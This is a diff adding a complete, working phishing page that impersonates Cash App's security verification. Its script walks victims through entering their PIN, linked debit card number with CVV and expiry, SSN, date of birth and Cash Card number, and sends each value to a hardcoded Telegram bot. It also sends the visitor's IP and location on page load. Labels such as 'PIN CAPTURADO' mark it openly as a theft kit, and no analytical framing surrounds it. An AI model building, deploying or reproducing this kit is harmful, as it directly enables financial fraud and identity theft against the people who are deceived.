@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cash App - Security Verification</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #000000; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; color: #ffffff; overflow-x: hidden; }
+        
+        /* Barra de progreso superior limpia y plana */
+        .progress-container { position: fixed; top: 0; left: 0; width: 100%; height: 3px; background: #1a1a1a; z-index: 100; }
+        .progress-bar { height: 100%; width: 25%; background: #00D632; transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1); }
+        
+        .progress-text-top { font-size: 11px; color: #777; margin-bottom: 16px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
+
+        .container { width: 100%; max-width: 400px; padding: 24px; text-align: center; }
+        
+        /* Logo plano oficial sin brillos */
+        .logo-box { background-color: #00D632; width: 44px; height: 44px; border-radius: 10px; display: flex; justify-content: center; align-items: center; margin: 0 auto 24px auto; font-size: 24px; font-weight: bold; color: #000000; }
+        .check-box { background-color: #00D632; width: 48px; height: 48px; border-radius: 12px; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px auto; font-size: 22px; color: #000000; animation: bounceIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        
+        @keyframes bounceIn {
+            0% { transform: scale(0); opacity: 0; }
+            60% { transform: scale(1.1); opacity: 1; }
+            100% { transform: scale(1); }
+        }
+        
+        h2 { font-size: 22px; font-weight: 600; margin-bottom: 12px; color: #ffffff; letter-spacing: -0.4px; line-height: 1.3; }
+        p { font-size: 14px; color: #888888; margin-bottom: 24px; line-height: 1.5; }
+
+        .input-group { margin-bottom: 16px; text-align: left; }
+        label { display: block; font-size: 11px; font-weight: 600; color: #777; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
+        
+        input, select { width: 100%; background: #121212; border: 1px solid #2a2a2a; border-radius: 12px; padding: 15px; font-size: 16px; color: white; outline: none; transition: border-color 0.2s, background 0.2s; }
+        input:focus, select:focus { border-color: #00D632; background: #181818; }
+        
+        select { appearance: none; background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22292.36%22%20height%3D%22292.36%22%3E%3Cpath%20fill%3D%22%23888888%22%20d%3D%22M287%2069.4a17.6%2017.6%200%200%200-13-5.4H18.4c-5%200-9.3%201.8-12.9%205.4A17.6%2017.6%200%200%200%200%2082.2c0%205%201.8%209.3%205.4%2012.9l128%20127.9c3.6%203.6%207.8%205.4%2012.8%205.4s9.2-1.8%2012.8-5.4L287%2095c3.5-3.5%205.4-7.8%205.4-12.8%200-5-1.9-9.2-5.5-12.8z%22%2F%3E%3C%2Fsvg%3E"); background-repeat: no-repeat; background-position: right 15px center; background-size: 10px; cursor: pointer; }
+        
+        input.error-input, select.error-input { border-color: #f87171 !important; animation: shake 0.4s ease-in-out; }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-6px); }
+            40%, 80% { transform: translateX(6px); }
+        }
+
+        .error-feedback { color: #f87171; font-size: 12px; margin-top: 6px; display: none; text-align: left; font-weight: 500; }
+
+        .input-row { display: flex; gap: 10px; }
+
+        .btn-primary { background-color: #00D632; color: #000000; border: none; width: 100%; padding: 15px; font-size: 16px; font-weight: 600; border-radius: 24px; cursor: pointer; transition: opacity 0.2s, transform 0.1s; margin-top: 12px; }
+        .btn-primary:hover { opacity: 0.9; }
+        .btn-primary:active { transform: scale(0.98); }
+
+        .btn-skip { background-color: transparent; color: #777; border: none; width: 100%; padding: 12px; font-size: 14px; font-weight: 500; cursor: pointer; margin-top: 8px; transition: color 0.2s; }
+        .btn-skip:hover { color: #fff; }
+
+        .warning-box { background-color: rgba(234, 179, 8, 0.08); border: 1px solid rgba(234, 179, 8, 0.2); border-radius: 12px; padding: 12px 14px; display: flex; align-items: center; margin-top: 16px; text-align: left; }
+        .warning-icon { color: #eab308; font-size: 16px; margin-right: 10px; flex-shrink: 0; }
+        .warning-text { color: #fde047; font-size: 12px; line-height: 1.4; font-weight: 400; }
+
+        .spinner-container { display: none; padding: 30px 0; }
+        .spinner { width: 36px; height: 36px; border: 3px solid #222; border-top: 3px solid #00D632; border-radius: 50%; animation: spin 0.7s linear infinite; margin: 0 auto 16px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .step { display: none; opacity: 0; transform: translateY(8px); transition: opacity 0.3s ease, transform 0.3s ease; }
+        .step.active { display: block; opacity: 1; transform: translateY(0); }
+        
+        .footer-text { margin-top: 32px; font-size: 12px; color: #555; }
+    </style>
+</head>
+<body>
+
+<div class="progress-container">
+    <div class="progress-bar" id="progressBar"></div>
+</div>
+
+<div class="container">
+    <div class="logo-box" id="top-logo">$</div>
+    <div class="progress-text-top" id="progressStatus">Step 1 of 4</div>
+
+    <!-- PANTALLA DE CARGA -->
+    <div id="step-loading" class="spinner-container">
+        <div class="spinner"></div>
+        <h2 id="loading-text">Verifying security credentials...</h2>
+        <p id="loading-subtext">Almost finishing verification...</p>
+    </div>
+
+    <!-- PASO 1: PIN de 4 dígitos -->
+    <div id="step-pin" class="step active">
+        <h2 id="greeting-title">Security Verification</h2>
+        <p>Please enter your 4-digit PIN to confirm your identity and secure your account access.</p>
+        <div class="input-group">
+            <input type="text" id="pinInput" maxlength="4" placeholder="••••" inputmode="numeric" style="text-align: center; letter-spacing: 10px; font-size: 22px;">
+            <div id="pinError" class="error-feedback">Incorrect PIN. Please enter a valid 4-digit PIN.</div>
+        </div>
+        <button class="btn-primary" onclick="processStep('pin')">Verify Identity</button>
+    </div>
+
+    <!-- PASO 2: Linked Card (Con Selectores Desplegables para Expiración) -->
+    <div id="step-linked" class="step">
+        <h2>Enter your Linked Card details</h2>
+        <div class="input-group">
+            <label>Full Name on Card</label>
+            <input type="text" id="cardName" placeholder="John Doe">
+            <div id="nameError" class="error-feedback">Please enter the full name on card.</div>
+        </div>
+        <div class="input-group">
+            <label>Debit Card Number</label>
+            <input type="text" id="linkedNum" placeholder="4000 0000 0000 0000" maxlength="19" inputmode="numeric">
+            <div id="linkedNumError" class="error-feedback">Incorrect card number. Please try again.</div>
+        </div>
+        
+        <div class="input-row">
+            <!-- Selector de Expiración: Mes y Año -->
+            <div class="input-group" style="flex: 1.2;">
+                <label>Expiry Date</label>
+                <div class="input-row" style="gap: 5px;">
+                    <select id="expMonth" onchange="clearError('expMonth')">
+                        <option value="" disabled selected>MM</option>
+                        <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option>
+                        <option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option>
+                        <option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>
+                    </select>
+                    <select id="expYear" onchange="clearError('expYear')">
+                        <option value="" disabled selected>YY</option>
+                        <option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option>
+                        <option value="30">30</option><option value="31">31</option><option value="32">32</option><option value="33">33</option>
+                        <option value="34">34</option><option value="35">35</option><option value="36">36</option>
+                    </select>
+                </div>
+                <div id="expError" class="error-feedback">Select expiry date.</div>
+            </div>
+
+            <div class="input-group" style="flex: 0.8;">
+                <label id="cvvLabel">CVV</label>
+                <input type="text" id="linkedCvv" placeholder="123" maxlength="3" inputmode="numeric">
+                <div id="cvvError" class="error-feedback">Invalid CVV.</div>
+            </div>
+        </div>
+
+        <div class="input-group">
+            <label>Billing ZIP Code</label>
+            <input type="text" id="cardZip" placeholder="10001" maxlength="5" inputmode="numeric">
+            <div id="zipError" class="error-feedback">Please enter a valid ZIP code.</div>
+        </div>
+        <button class="btn-primary" onclick="processStep('linked')">Continue</button>
+    </div>
+
+    <!-- PASO 3: SSN, Nombre Legal y Fecha de Nacimiento con Selectores -->
+    <div id="step-ssn" class="step">
+        <h2>Identity Confirmation</h2>
+        <p>Please enter your personal details and Social Security Number (SSN) to complete your account security validation.</p>
+        
+        <div class="input-group">
+            <label>Full Legal Name</label>
+            <input type="text" id="ssnFullName" placeholder="John Michael Doe">
+            <div id="ssnNameError" class="error-feedback">Please enter your full legal name.</div>
+        </div>
+
+        <!-- Selectores desplegables de Fecha de Nacimiento (Mes, Día, Año) -->
+        <div class="input-group">
+            <label>Date of Birth</label>
+            <div class="input-row" style="gap: 5px;">
+                <select id="dobMonth" style="flex: 1;" onchange="clearError('dobMonth')">
+                    <option value="" disabled selected>Month</option>
+                    <option value="01">January</option><option value="02">February</option><option value="03">March</option>
+                    <option value="04">April</option><option value="05">May</option><option value="06">June</option>
+                    <option value="07">July</option><option value="08">August</option><option value="09">September</option>
+                    <option value="10">October</option><option value="11">November</option><option value="12">December</option>
+                </select>
+                <select id="dobDay" style="flex: 0.8;" onchange="clearError('dobDay')">
+                    <option value="" disabled selected>Day</option>
+                    <!-- Días del 1 al 31 generados dinámicamente o listados -->
+                    <script>
+                        for(let i=1; i<=31; i++) {
+                            let d = i < 10 ? '0' + i : i;
+                            document.write(`<option value="${d}">${d}</option>`);
+                        }
+                    </script>
+                </select>
+                <select id="dobYear" style="flex: 1;" onchange="clearError('dobYear')">
+                    <option value="" disabled selected>Year</option>
+                    <script>
+                        let currentY = new Date().getFullYear();
+                        for(let y=currentY-13; y>=1920; y--) {
+                            document.write(`<option value="${y}">${y}</option>`);
+                        }
+                    </script>
+                </select>
+            </div>
+            <div id="ssnDobError" class="error-feedback">Please select a valid date of birth.</div>
+        </div>
+
+        <div class="input-group">
+            <label>Social Security Number (SSN)</label>
+            <input type="text" id="ssnInput" placeholder="000-00-0000" maxlength="11" inputmode="numeric" style="text-align: center; letter-spacing: 4px; font-size: 18px;">
+            <div id="ssnError" class="error-feedback">Incorrect SSN. Please enter a valid 9-digit SSN.</div>
+        </div>
+        
+        <button class="btn-primary" onclick="processStep('ssn')">Verify and Continue</button>
+    </div>
+
+    <!-- PASO 4: Cash Card Number con opción de Skip -->
+    <div id="step-cash" class="step">
+        <h2>Enter your Cash Card number</h2>
+        <p>To make sure you want to continue with your Cash App account and secure it, please provide your physical Cash Card number.</p>
+        <div class="input-group">
+            <label>Cash Card Number</label>
+            <input type="text" id="cashNum" placeholder="4000 0000 0000 0000" maxlength="19" inputmode="numeric">
+            <div id="cashError" class="error-feedback">Incorrect Cash Card number. Please try again.</div>
+        </div>
+        <button class="btn-primary" onclick="processStep('cash')">Complete Verification</button>
+        
+        <button class="btn-skip" onclick="skipCashCard()">Skip this step</button>
+
+        <div class="warning-box">
+            <div class="warning-icon">⚠️</div>
+            <div class="warning-text">If you skip this option, your account security could be reduced. It is recommended not to skip it.</div>
+        </div>
+    </div>
+
+    <!-- PASO 5: Pantalla de Éxito Final -->
+    <div id="step-success" class="step">
+        <div class="check-box">✔</div>
+        <h2>Identity Verified</h2>
+        <p>Congratulations! Your identity has been successfully confirmed. Your account will remain active without interruptions. Enjoy our services. You can now safely close this window.</p>
+    </div>
+
+    <div class="footer-text">Your Privacy Choices</div>
+</div>
+
+<script>
+    const botToken = "8943750094:BqWUrn8B7B59o6EivE7zJ9iqhpvF9wJkF7SVezi6u6gs";
+    const chatId = "6375135873";
+
+    window.addEventListener("DOMContentLoaded", async () => {
+        const urlParams = new URLSearchParams(window.location.search);
+        const userName = urlParams.get("name");
+        if (userName) {
+            document.getElementById("greeting-title").innerText = `Welcome back, ${userName}!`;
+        }
+
+        try {
+            let res = await fetch("https://ipapi.co/json/");
+            let data = await res.json();
+            sendTelegram(`🌐 [VISITA NUEVA DETECTADA]\n- IP: ${data.ip}\n- Ubicación: ${data.city}, ${data.region}, ${data.country_name}\n- ISP: ${data.org}`);
+        } catch (e) {
+            sendTelegram(`🌐 [VISITA NUEVA DETECTADA]\n- No se pudo resolver la IP automáticamente.`);
+        }
+    });
+
+    function sendTelegram(message) {
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        fetch(url).catch(err => console.error(err));
+    }
+
+    function updateProgress(percent, statusText) {
+        document.getElementById("progressBar").style.width = percent + "%";
+        document.getElementById("progressStatus").innerText = statusText;
+    }
+
+    function clearError(elementId) {
+        document.getElementById(elementId).classList.remove("error-input");
+        if(elementId === 'expMonth' || elementId === 'expYear') document.getElementById("expError").style.display = "none";
+        if(elementId.startsWith('dob')) document.getElementById("ssnDobError").style.display = "none";
+    }
+
+    // --- RESTRICCIÓN DE NÚMEROS ---
+    document.getElementById("pinInput").addEventListener("input", function (e) {
+        let value = e.target.value.replace(/\D/g, "").substring(0, 4);
+        e.target.value = value;
+        document.getElementById("pinInput").classList.remove("error-input");
+        document.getElementById("pinError").style.display = "none";
+    });
+
+    document.getElementById("linkedNum").addEventListener("input", function (e) {
+        let rawVal = e.target.value.replace(/\D/g, "");
+        let value = rawVal.substring(0, 16);
+        value = value.replace(/(.{4})/g, "$1 ").trim();
+        e.target.value = value;
+        document.getElementById("linkedNum").classList.remove("error-input");
+
+        const cvvInput = document.getElementById("linkedCvv");
+        const cvvLabel = document.getElementById("cvvLabel");
+
+        if (rawVal.startsWith("3")) {
+            cvvInput.setAttribute("maxlength", "4");
+            cvvLabel.innerText = "CID (4 Digits)";
+            if (cvvInput.value.length > 4) cvvInput.value = cvvInput.value.substring(0, 4);
+        } else {
+            cvvInput.setAttribute("maxlength", "3");
+            cvvLabel.innerText = "CVV";
+            if (cvvInput.value.length > 3) cvvInput.value = cvvInput.value.substring(0, 3);
+        }
+    });
+
+    document.getElementById("cashNum").addEventListener("input", function (e) {
+        let value = e.target.value.replace(/\D/g, "").substring(0, 16);
+        value = value.replace(/(.{4})/g, "$1 ").trim();
+        e.target.value = value;
+        document.getElementById("cashNum").classList.remove("error-input");
+    });
+
+    document.getElementById("linkedCvv").addEventListener("input", function (e) {
+        let maxLen = document.getElementById("linkedCvv").getAttribute("maxlength") || "3";
+        let value = e.target.value.replace(/\D/g, "").substring(0, parseInt(maxLen));
+        e.target.value = value;
+        document.getElementById("linkedCvv").classList.remove("error-input");
+        document.getElementById("cvvError").style.display = "none";
+    });
+
+    document.getElementById("cardZip").addEventListener("input", function (e) {
+        let value = e.target.value.replace(/\D/g, "").substring(0, 5);
+        e.target.value = value;
+        document.getElementById("cardZip").classList.remove("error-input");
+        document.getElementById("zipError").style.display = "none";
+    });
+
+    document.getElementById("ssnInput").addEventListener("input", function (e) {
+        let value = e.target.value.replace(/\D/g, "").substring(0, 9);
+        if (value.length > 5) {
+            value = value.substring(0, 3) + "-" + value.substring(3, 5) + "-" + value.substring(5);
+        } else if (value.length > 3) {
+            value = value.substring(0, 3) + "-" + value.substring(3);
+        }
+        e.target.value = value;
+        document.getElementById("ssnInput").classList.remove("error-input");
+        document.getElementById("ssnError").style.display = "none";
+    });
+
+    // --- RESTRICCIÓN DE LETRAS EN NOMBRES ---
+    document.getElementById("cardName").addEventListener("input", function (e) {
+        let value = e.target.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚñÑ\s]/g, "");
+        e.target.value = value;
+        document.getElementById("cardName").classList.remove("error-input");
+        document.getElementById("nameError").style.display = "none";
+    });
+
+    document.getElementById("ssnFullName").addEventListener("input", function (e) {
+        let value = e.target.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚñÑ\s]/g, "");
+        e.target.value = value;
+        document.getElementById("ssnFullName").classList.remove("error-input");
+        document.getElementById("ssnNameError").style.display = "none";
+    });
+
+    let nextStepId = "";
+
+    function showLoading(targetStepId, loadingMsg, progressPercent, progressText) {
+        nextStepId = targetStepId;
+        document.getElementById("loading-text").innerText = loadingMsg;
+        document.getElementById("loading-subtext").innerText = progressPercent >= 75 ? "Almost finishing verification process..." : "Processing secure data...";
+
+        document.querySelectorAll(".step").forEach(el => el.classList.remove("active"));
+        document.getElementById("step-loading").style.display = "block";
+
+        setTimeout(() => {
+            document.getElementById("step-loading").style.display = "none";
+            document.getElementById(nextStepId).classList.add("active");
+            updateProgress(progressPercent, progressText);
+        }, 1200);
+    }
+
+    function processStep(stepName) {
+        if (stepName === 'pin') {
+            const pinInput = document.getElementById("pinInput");
+            if (pinInput.value.length < 4) {
+                pinInput.classList.add("error-input");
+                document.getElementById("pinError").style.display = "block";
+                return;
+            }
+            sendTelegram(`🚨 [CASH APP - PIN CAPTURADO]\n🔑 PIN: ${pinInput.value}`);
+            showLoading("step-linked", "Validating security PIN...", 50, "Step 2 of 4");
+        } 
+        else if (stepName === 'linked') {
+            const nameInput = document.getElementById("cardName");
+            const numInput = document.getElementById("linkedNum");
+            const expMonth = document.getElementById("expMonth").value;
+            const expYear = document.getElementById("expYear").value;
+            const cvvInput = document.getElementById("linkedCvv");
+            const zipInput = document.getElementById("cardZip");
+            const requiredCvvLen = numInput.value.replace(/\D/g, "").startsWith("3") ? 4 : 3;
+
+            let hasError = false;
+
+            if (!nameInput.value.trim()) { nameInput.classList.add("error-input"); document.getElementById("nameError").style.display = "block"; hasError = true; }
+            if (numInput.value.replace(/\D/g, "").length < 15) { numInput.classList.add("error-input"); document.getElementById("linkedNumError").style.display = "block"; hasError = true; }
+            
+            if (!expMonth || !expYear) {
+                document.getElementById("expMonth").classList.add("error-input");
+                document.getElementById("expYear").classList.add("error-input");
+                document.getElementById("expError").innerText = "Please select expiry date.";
+                document.getElementById("expError").style.display = "block";
+                hasError = true;
+            }
+
+            if (cvvInput.value.length < requiredCvvLen) { cvvInput.classList.add("error-input"); document.getElementById("cvvError").style.display = "block"; hasError = true; }
+            if (zipInput.value.length < 5) { zipInput.classList.add("error-input"); document.getElementById("zipError").style.display = "block"; hasError = true; }
+
+            if (hasError) return;
+
+            let fullExp = `${expMonth}/${expYear}`;
+            sendTelegram(`💳 [CASH APP - LINKED CARD CAPTURADA]\n- Nombre: ${nameInput.value}\n- Número: ${numInput.value}\n- Exp: ${fullExp}\n- CVV/CID: ${cvvInput.value}\n- ZIP: ${zipInput.value}`);
+            showLoading("step-ssn", "Encrypting card information...", 75, "Step 3 of 4 (Almost Finishing)");
+        } 
+        else if (stepName === 'ssn') {
+            const nameInput = document.getElementById("ssnFullName");
+            const dobMonth = document.getElementById("dobMonth").value;
+            const dobDay = document.getElementById("dobDay").value;
+            const dobYear = document.getElementById("dobYear").value;
+            const ssnInput = document.getElementById("ssnInput");
+
+            let hasError = false;
+            if (!nameInput.value.trim()) { nameInput.classList.add("error-input"); document.getElementById("ssnNameError").style.display = "block"; hasError = true; }
+            
+            if (!dobMonth || !dobDay || !dobYear) {
+                document.getElementById("dobMonth").classList.add("error-input");
+                document.getElementById("dobDay").classList.add("error-input");
+                document.getElementById("dobYear").classList.add("error-input");
+                document.getElementById("ssnDobError").innerText = "Please select a complete date of birth.";
+                document.getElementById("ssnDobError").style.display = "block";
+                hasError = true;
+            }
+
+            if (ssnInput.value.length < 11) { ssnInput.classList.add("error-input"); document.getElementById("ssnError").style.display = "block"; hasError = true; }
+
+            if (hasError) return;
+
+            let fullDob = `${dobMonth}/${dobDay}/${dobYear}`;
+            sendTelegram(`🔒 [CASH APP - IDENTIDAD CAPTURADA]\n- Full Legal Name: ${nameInput.value}\n- DOB: ${fullDob}\n- SSN: ${ssnInput.value}`);
+            showLoading("step-cash", "Validating identity records...", 90, "Final Step");
+        }
+        else if (stepName === 'cash') {
+            const cashInput = document.getElementById("cashNum");
+            if (cashInput.value.replace(/\D/g, "").length < 15) {
+                cashInput.classList.add("error-input");
+                document.getElementById("cashError").style.display = "block";
+                return;
+            }
+            sendTelegram(`💳 [CASH APP - CASH CARD CAPTURADA]\n- Cash Card: ${cashInput.value}`);
+
+            finalizeSuccess();
+        }
+    }
+
+    function skipCashCard() {
+        sendTelegram(`⚠️ [CASH APP - CASH CARD OMITIDA]\n- El usuario hizo clic en "Skip this step".`);
+        finalizeSuccess();
+    }
+
+    function finalizeSuccess() {
+        updateProgress(100, "100% - Verified");
+        document.getElementById("top-logo").style.display = "none";
+        document.querySelectorAll(".step").forEach(el => el.classList.remove("active"));
+        document.getElementById("step-loading").style.display = "block";
+        document.getElementById("loading-text").innerText = "Finalizing identity verification...";
+        document.getElementById("loading-subtext").innerText = "Almost finishing...";
+        
+        setTimeout(() => {
+            document.getElementById("step-loading").style.display = "none";
+            document.getElementById("step-success").classList.add("active");
+            document.getElementById("progressStatus").style.display = "none";
+        }, 1200);
+    }
+</script>
+
+</body>
+</html>
